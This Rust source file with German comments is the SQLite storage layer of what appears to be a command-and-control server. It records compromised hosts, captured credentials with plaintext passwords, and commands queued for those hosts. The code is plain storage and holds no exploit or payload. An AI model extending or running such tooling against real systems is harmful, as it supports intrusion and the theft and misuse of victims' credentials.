//! Kx-Server Datenbank-Schicht (rusqlite).
//!
//! Speichert kompromittierte Hosts, erbeutete Secrets und ausgeführte Tasks.

use std::path::Path;
use std::sync::Mutex;

use rusqlite::{Connection, params};
use serde::{Deserialize, Serialize};

/// Ein kompromittierter oder erkannter Host.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Host {
    pub id: String,
    pub ip: String,
    pub hostname: String,
    pub os: String,
    pub status: String,
    pub first_seen: String,
    pub last_seen: String,
}

/// Ein erbeutetes Secret (Credential).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Secret {
    pub id: String,
    pub host_id: String,
    pub cred_type: String,
    pub username: String,
    pub password: String,
    pub source: String,
    pub collected_at: String,
}

/// Ein auszuführender oder bereits ausgeführter Task.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Task {
    pub id: String,
    pub host_id: String,
    pub command: String,
    pub status: String,
    pub result: String,
    pub created_at: String,
}

/// Fehler beim Datenbankzugriff.
#[derive(Debug, thiserror::Error)]
pub enum DbError {
    #[error("rusqlite-Fehler: {0}")]
    Sqlite(#[from] rusqlite::Error),
    #[error("Zeilendekodierung fehlgeschlagen")]
    RowDecode,
}

/// Die Server-Datenbank, thread-sicher um eine rusqlite-Connection.
pub struct Db {
    conn: Mutex<Connection>,
}

impl Db {
    /// Erzeugt oder öffnet die Datenbank und legt das Schema an.
    pub fn open(path: &Path) -> Result<Self, DbError> {
        let conn = Connection::open(path)?;
        conn.execute_batch(
            "CREATE TABLE IF NOT EXISTS hosts (
                id TEXT PRIMARY KEY, ip TEXT, hostname TEXT, os TEXT,
                status TEXT, first_seen TEXT, last_seen TEXT
            );
            CREATE TABLE IF NOT EXISTS secrets (
                id TEXT PRIMARY KEY, host_id TEXT, cred_type TEXT,
                username TEXT, password TEXT, source TEXT, collected_at TEXT
            );
            CREATE TABLE IF NOT EXISTS tasks (
                id TEXT PRIMARY KEY, host_id TEXT, command TEXT,
                status TEXT, result TEXT, created_at TEXT
            );",
        )?;
        Ok(Self { conn: Mutex::new(conn) })
    }

    /// Registriert einen Host (neu oder bestehend).
    pub fn upsert_host(&self, h: &Host) -> Result<(), DbError> {
        self.conn.lock().unwrap().execute(
            "INSERT INTO hosts (id, ip, hostname, os, status, first_seen, last_seen)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)
             ON CONFLICT(id) DO UPDATE SET
               last_seen=?7, os=?4, status=?5",
            params![h.id, h.ip, h.hostname, h.os, h.status, h.first_seen, h.last_seen],
        )?;
        Ok(())
    }

    /// Liefert alle Hosts.
    pub fn list_hosts(&self) -> Result<Vec<Host>, DbError> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn.prepare(
            "SELECT id, ip, hostname, os, status, first_seen, last_seen FROM hosts",
        )?;
        let rows = stmt.query_map([], |r| {
            Ok(Host {
                id: r.get(0)?,
                ip: r.get(1)?,
                hostname: r.get(2)?,
                os: r.get(3)?,
                status: r.get(4)?,
                first_seen: r.get(5)?,
                last_seen: r.get(6)?,
            })
        })?;
        rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
    }

    /// Speichert ein neues Secret.
    pub fn insert_secret(&self, s: &Secret) -> Result<(), DbError> {
        self.conn.lock().unwrap().execute(
            "INSERT INTO secrets (id, host_id, cred_type, username, password, source, collected_at)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
            params![s.id, s.host_id, s.cred_type, s.username, s.password, s.source, s.collected_at],
        )?;
        Ok(())
    }

    /// Liefert alle Secrets.
    pub fn list_secrets(&self) -> Result<Vec<Secret>, DbError> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn.prepare(
            "SELECT id, host_id, cred_type, username, password, source, collected_at FROM secrets",
        )?;
        let rows = stmt.query_map([], |r| {
            Ok(Secret {
                id: r.get(0)?,
                host_id: r.get(1)?,
                cred_type: r.get(2)?,
                username: r.get(3)?,
                password: r.get(4)?,
                source: r.get(5)?,
                collected_at: r.get(6)?,
            })
        })?;
        rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
    }

    /// Erzeugt einen Task.
    pub fn insert_task(&self, t: &Task) -> Result<(), DbError> {
        self.conn.lock().unwrap().execute(
            "INSERT INTO tasks (id, host_id, command, status, result, created_at)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            params![t.id, t.host_id, t.command, t.status, t.result, t.created_at],
        )?;
        Ok(())
    }

    /// Liefert alle Tasks.
    pub fn list_tasks(&self) -> Result<Vec<Task>, DbError> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn.prepare(
            "SELECT id, host_id, command, status, result, created_at FROM tasks",
        )?;
        let rows = stmt.query_map([], |r| {
            Ok(Task {
                id: r.get(0)?,
                host_id: r.get(1)?,
                command: r.get(2)?,
                status: r.get(3)?,
                result: r.get(4)?,
                created_at: r.get(5)?,
            })
        })?;
        rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
    }
}
